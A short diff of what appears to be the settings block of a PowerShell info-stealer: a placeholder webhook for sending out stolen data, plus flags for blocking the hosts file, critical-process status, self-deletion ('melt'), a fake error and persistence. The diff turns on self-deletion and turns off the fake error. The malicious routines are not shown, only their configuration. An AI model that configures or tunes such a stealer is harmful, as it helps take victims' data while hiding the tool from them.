@@ -2,8 +2,8 @@ $webhook = "YOUR_WEBHOOK_HERE"
 $debug = $false
 $blockhostsfile = $true
 $criticalprocess = $true
-$melt = $false
-$fakeerror = $true
+$melt = $true
+$fakeerror = $false
 $persistence = $false
 
 if ($debug) {
